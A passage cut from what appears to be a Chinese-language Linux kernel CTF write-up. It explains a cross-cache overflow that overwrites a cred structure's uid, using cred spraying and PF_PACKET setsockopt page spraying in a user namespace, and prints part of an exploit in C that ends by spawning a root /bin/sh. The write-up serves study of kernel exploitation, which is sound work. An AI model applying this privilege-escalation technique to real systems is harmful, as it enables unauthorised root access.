<p>我们不难想到的是：从更高阶 order 拆分成的两份低阶 order 的连续内存页<strong>是物理连续的</strong>，若其中的一份被我们的 <code>kmem_cache</code> 取走，而另一份被用于分配其他内核结构体的 <code>kmem_cache</code> 取走，<strong>则我们便有可能溢出到其他的内核结构体上</strong>——这便是 **<code>cross-cache overflow</code>**。</p>
<p>具体的溢出对象也并不难想——6个字节刚好足够我们溢出到 <code>cred</code> 结构体的 <code>uid</code> 字段，完成提权，那么如何溢出到我们想要提权的进程的 cred 结构体呢？我们只需要先 fork() 堆喷 cred 耗尽 <code>cred_jar </code> 中 object，让其向 buddy system 请求新的页面即可，我们还需要先堆喷消耗 buddy system 中原有的页面，之后我们再分配 cred 和题目 object，两者便有较大概率相邻。</p>
<p><code>cred</code> 的大小为 <code>192</code>，<code>cred_jar</code> 向 buddy system 单次请求的页面数量为 1，足够分配 21 个 cred，因此我们不需要堆喷太多 <code>cred</code> 便能耗尽 <code>cred_jar</code>，不过 <code>fork()</code> 在执行过程中会产生很多的”噪声“（即额外分配一些我们不需要的结构体，从而影响页布局），因此这里我们改用 <code>clone(CLONE_FILES | CLONE_FS | CLONE_VM | CLONE_SIGHAND)</code>。</p>
<p>使用 <code>setsockopt()</code> 进行页喷射的方法：当我们创建一个 protocol 为 <code>PF_PACKET</code> 的 socket 之后，先调用 <code>setsockopt()</code> 将 <code>PACKET_VERSION</code> 设为  <code>TPACKET_V1 </code>&#x2F; <code>TPACKET_V2</code>，再调用 <code>setsockopt()</code> 提交一个 <code>PACKET_TX_RING</code> ，此时便存在如下调用链：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">__sys_setsockopt()</span><br><span class="line">    sock-&gt;ops-&gt;setsockopt()</span><br><span class="line">    	packet_setsockopt() <span class="comment">// case PACKET_TX_RING ↓</span></span><br><span class="line">    		packet_set_ring()</span><br><span class="line">    			alloc_pg_vec()</span><br></pre></td></tr></table></figure></div>

<p>在 <code>alloc_pg_vec()</code> 中会创建一个 <code>pgv</code> 结构体，用以分配 <code>tp_block_nr</code> 份 2 order 张内存页，其中 <code>order</code> 由 <code>tp_block_size</code> 决定：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">struct</span> pgv *<span class="title function_">alloc_pg_vec</span><span class="params">(<span class="keyword">struct</span> tpacket_req *req, <span class="type">int</span> order)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> block_nr = req-&gt;tp_block_nr;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pgv</span> *<span class="title">pg_vec</span>;</span></span><br><span class="line">	<span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">	pg_vec = kcalloc(block_nr, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> pgv), GFP_KERNEL | __GFP_NOWARN);</span><br><span class="line">	<span class="keyword">if</span> (unlikely(!pg_vec))</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; block_nr; i++) &#123;</span><br><span class="line">		pg_vec[i].buffer = alloc_one_pg_vec_page(order);</span><br><span class="line">		<span class="keyword">if</span> (unlikely(!pg_vec[i].buffer))</span><br><span class="line">			<span class="keyword">goto</span> out_free_pgvec;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">out:</span><br><span class="line">	<span class="keyword">return</span> pg_vec;</span><br><span class="line"></span><br><span class="line">out_free_pgvec:</span><br><span class="line">	free_pg_vec(pg_vec, order, block_nr);</span><br><span class="line">	pg_vec = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在 <code>alloc_one_pg_vec_page()</code> 中会直接调用 <code>__get_free_pages()</code> 向 buddy system 请求内存页，因此我们可以利用该函数进行大量的页面请求：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">char</span> *<span class="title function_">alloc_one_pg_vec_page</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> order)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> *buffer;</span><br><span class="line">	<span class="type">gfp_t</span> gfp_flags = GFP_KERNEL | __GFP_COMP |</span><br><span class="line">			  __GFP_ZERO | __GFP_NOWARN | __GFP_NORETRY;</span><br><span class="line"></span><br><span class="line">	buffer = (<span class="type">char</span> *) __get_free_pages(gfp_flags, order);</span><br><span class="line">	<span class="keyword">if</span> (buffer)</span><br><span class="line">		<span class="keyword">return</span> buffer;</span><br><span class="line">	<span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>pgv</code> 中的页面会在 socket 被关闭后释放，这也方便我们后续的页级堆风水，不过需要注意的是低权限用户无法使用该函数，但是我们可以通过开辟新的命名空间来绕过该限制。</p>
<p>这里需要注意的是<strong>我们提权的进程不应当和页喷射的进程在同一命名空间内</strong>，因为后者需要开辟新的命名空间，而我们应当在原本的命名空间完成提权，因此这里选择新开一个进程进行页喷射，并使用管道在主进程与喷射进程间通信。（如果你忘了这一步，就会得到一个 <code>65534</code> 的 uid 然后冥思苦想半天…）。</p>
<p><code>setsockopt()</code>  也可以帮助我们完成<strong>页级堆风水</strong>，当我们耗尽 buddy system 中的 low order pages 后，我们再请求的页面便都是物理连续的，因此此时我们再进行  <code>setsockopt()</code>  便<strong>相当于获取到了一块近乎物理连续的内存</strong>（为什么是”近乎连续“是因为大量的 <code>setsockopt()</code> 流程中同样会分配大量我们不需要的结构体，从而消耗 buddy system 的部分页面）</p>
<p>本题环境中题目的 <code>kmem_cache</code> 单次会向 buddy system 请求一张内存页，而由于 buddy system 遵循 LIFO，因此我们可以：</p>
<ul>
<li>先分配大量的单张内存页，耗尽 buddy 中的 low-order pages。</li>
<li>间隔一张内存页释放掉部分单张内存页，之后堆喷 cred，这样便有几率获取到我们释放的单张内存页。</li>
<li>释放掉之前的间隔内存页，调用漏洞函数分配堆块，这样便有几率获取到我们释放的间隔内存页。</li>
<li>利用模块中漏洞进行越界写，篡改 <code>cred-&gt;uid</code> ，完成提权。</li>
</ul>
<p>我们的子进程需要轮询等待自己的 uid 变为 root，这里选择用一个新的管道在主进程与子进程间通信，当子进程从管道中读出1字节时便开始检查自己是否成功提权，若未提权则直接 sleep 即可。</p>
<h3 id="exp-25"><a href="#exp-25" class="headerlink" title="exp"></a>exp</h3><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PGV_CRED_START (PGV_PAGE_NUM / 2)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_SPRAY_NUM 514</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VUL_OBJ_NUM 400</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VUL_OBJ_SIZE 512</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VUL_OBJ_PER_SLUB 8</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VUL_OBJ_SLUB_NUM (VUL_OBJ_NUM / VUL_OBJ_PER_SLUB)</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">castaway_request</span> &#123;</span></span><br><span class="line">    <span class="type">int64_t</span> index;</span><br><span class="line">    <span class="type">size_t</span> size;</span><br><span class="line">    <span class="type">void</span> *buf;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> dev_fd;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">err_exit</span><span class="params">(<span class="type">char</span> *msg)</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error: %s\033[0m\n&quot;</span>, msg);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">alloc</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    ioctl(dev_fd, <span class="number">0xCAFEBABE</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">edit</span><span class="params">(<span class="type">int64_t</span> index, <span class="type">size_t</span> size, <span class="type">void</span> *buf)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">castaway_request</span> <span class="title">r</span> =</span> &#123;</span><br><span class="line">            .index = index,</span><br><span class="line">            .size = size,</span><br><span class="line">            .buf = buf</span><br><span class="line">    &#125;;</span><br><span class="line">    ioctl(dev_fd, <span class="number">0xF00DBABE</span>, &amp;r);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> child_pipe_buf[<span class="number">1</span>];</span><br><span class="line"><span class="type">int</span> check_root_pipe[<span class="number">2</span>];</span><br><span class="line"><span class="type">char</span> bin_sh_str[] = <span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line"><span class="type">char</span> *shell_args[] = &#123;bin_sh_str, <span class="literal">NULL</span>&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">timespec</span> <span class="title">timer</span> =</span> &#123;</span><br><span class="line">        .tv_sec = <span class="number">100000000</span>,</span><br><span class="line">        .tv_nsec = <span class="number">0</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">waiting_for_root_fn</span><span class="params">(<span class="type">void</span> *args)</span> &#123;</span><br><span class="line">    <span class="comment">/* we&#x27;re using the same stack for them, so we need to avoid cracking it.. */</span></span><br><span class="line">    __asm__ <span class="title function_">volatile</span> <span class="params">(</span></span><br><span class="line"><span class="params">            <span class="string">&quot;   lea rax, [check_root_pipe]; &quot;</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot;   mov edi, dword ptr [rax]; &quot;</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot;   mov rsi, child_pipe_buf; &quot;</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot;   mov edx, 1;   &quot;</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot;   xor eax, eax; &quot;</span> <span class="comment">/* read(check_root_pipe[0], child_pipe_buf, 1)*/</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot;   syscall;      &quot;</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot;   mov eax, 102; &quot;</span> <span class="comment">/* getuid() */</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot;   syscall; &quot;</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot;   cmp eax, 0; &quot;</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot;   jne failed; &quot;</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot;   lea rdi, [bin_sh_str];  &quot;</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot;   lea rsi, [shell_args];  &quot;</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot;   xor edx, edx;   &quot;</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot;   mov eax, 59;    &quot;</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot;   syscall;        &quot;</span>   <span class="comment">/* execve(&quot;/bin/sh&quot;, args, NULL) */</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot;failed: &quot;</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot;   lea rdi, [timer]; &quot;</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot;   xor esi, esi; &quot;</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot;   mov eax, 35; &quot;</span>  <span class="comment">/* nanosleep() */</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot;   syscall; &quot;</span></span></span><br><span class="line"><span class="params">            )</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__attribute__((naked)) <span class="type">long</span> <span class="title function_">simple_clone</span><span class="params">(<span class="type">int</span> flags, <span class="type">int</span> (*fn)(<span class="type">void</span> *))</span> &#123;</span><br><span class="line">    <span class="comment">/* for syscall, it&#x27;s clone(flags, stack, ...) */</span></span><br><span class="line">    __asm__ <span class="title function_">volatile</span> <span class="params">(</span></span><br><span class="line"><span class="params">            <span class="string">&quot; mov r15, rsi; &quot;</span>   <span class="comment">/* save the rsi*/</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot; xor esi, esi; &quot;</span>   <span class="comment">/* set esp and useless args to NULL */</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot; xor edx, edx; &quot;</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot; xor r10d, r10d; &quot;</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot; xor r8d, r8d;   &quot;</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot; xor r9d, r9d;   &quot;</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot; mov eax, 56;  &quot;</span>   <span class="comment">/* __NR_clone */</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot; syscall;      &quot;</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot; cmp eax, 0;   &quot;</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot; je child_fn;  &quot;</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot; ret;          &quot;</span>   <span class="comment">/* parent */</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot;child_fn:      &quot;</span></span></span><br><span class="line"><span class="params">            <span class="string">&quot; jmp r15;      &quot;</span>   <span class="comment">/* child */</span></span></span><br><span class="line"><span class="params">            )</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief create an isolate namespace</span></span><br><span class="line"><span class="comment"> * note that the caller **SHOULD NOT** be used to get the root, but an operator</span></span><br><span class="line"><span class="comment"> * to perform basic exploiting operations in it only</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">unshare_setup</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="type">char</span> edit[<span class="number">0x100</span>];</span><br><span class="line">    <span class="type">int</span> tmp_fd;</span><br><span class="line"></span><br><span class="line">    unshare(CLONE_NEWNS | CLONE_NEWUSER | CLONE_NEWNET);</span><br><span class="line"></span><br><span class="line">    tmp_fd = open(<span class="string">&quot;/proc/self/setgroups&quot;</span>, O_WRONLY);</span><br><span class="line">    write(tmp_fd, <span class="string">&quot;deny&quot;</span>, <span class="built_in">strlen</span>(<span class="string">&quot;deny&quot;</span>));</span><br><span class="line">    close(tmp_fd);</span><br><span class="line"></span><br><span class="line">    tmp_fd = open(<span class="string">&quot;/proc/self/uid_map&quot;</span>, O_WRONLY);</span><br><span class="line">    <span class="built_in">snprintf</span>(edit, <span class="keyword">sizeof</span>(edit), <span class="string">&quot;0 %d 1&quot;</span>, getuid());</span><br><span class="line">    write(tmp_fd, edit, <span class="built_in">strlen</span>(edit));</span><br><span class="line">    close(tmp_fd);</span><br><span class="line"></span><br><span class="line">    tmp_fd = open(<span class="string">&quot;/proc/self/gid_map&quot;</span>, O_WRONLY);</span><br><span class="line">    <span class="built_in">snprintf</span>(edit, <span class="keyword">sizeof</span>(edit), <span class="string">&quot;0 %d 1&quot;</span>, getgid());</span><br><span class="line">    write(tmp_fd, edit, <span class="built_in">strlen</span>(edit));</span><br><span class="line">    close(tmp_fd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PGV_PAGE_NUM 1000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PACKET_VERSION 10</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PACKET_TX_RING 13</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tpacket_req</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> tp_block_size;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> tp_block_nr;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> tp_frame_size;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> tp_frame_nr;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* each allocation is (size * nr) bytes, aligned to PAGE_SIZE */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pgv_page_request</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> idx;</span><br><span class="line">    <span class="type">int</span> cmd;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> size;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> nr;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* operations type */</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line">    CMD_ALLOC_PAGE,</span><br><span class="line">    CMD_FREE_PAGE,</span><br><span class="line">    CMD_EXIT,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* tpacket version for setsockopt */</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">tpacket_versions</span> &#123;</span></span><br><span class="line">    TPACKET_V1,</span><br><span class="line">    TPACKET_V2,</span><br><span class="line">    TPACKET_V3,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* pipe for cmd communication */</span></span><br><span class="line"><span class="type">int</span> cmd_pipe_req[<span class="number">2</span>], cmd_pipe_reply[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">/* create a socket and alloc pages, return the socket fd */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">create_socket_and_alloc_pages</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> size, <span class="type">unsigned</span> <span class="type">int</span> nr)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tpacket_req</span> <span class="title">req</span>;</span></span><br><span class="line">    <span class="type">int</span> socket_fd, version;</span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">    socket_fd = socket(AF_PACKET, SOCK_RAW, PF_PACKET);</span><br><span class="line">    <span class="keyword">if</span> (socket_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[x] failed at socket(AF_PACKET, SOCK_RAW, PF_PACKET)\n&quot;</span>);</span><br><span class="line">        ret = socket_fd;</span><br><span class="line">        <span class="keyword">goto</span> err_out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    version = TPACKET_V1;</span><br><span class="line">    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_VERSION,</span><br><span class="line">                     &amp;version, <span class="keyword">sizeof</span>(version));</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[x] failed at setsockopt(PACKET_VERSION)\n&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> err_setsockopt;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(&amp;req, <span class="number">0</span>, <span class="keyword">sizeof</span>(req));</span><br><span class="line">    req.tp_block_size = size;</span><br><span class="line">    req.tp_block_nr = nr;</span><br><span class="line">    req.tp_frame_size = <span class="number">0x1000</span>;</span><br><span class="line">    req.tp_frame_nr = (req.tp_block_size * req.tp_block_nr) / 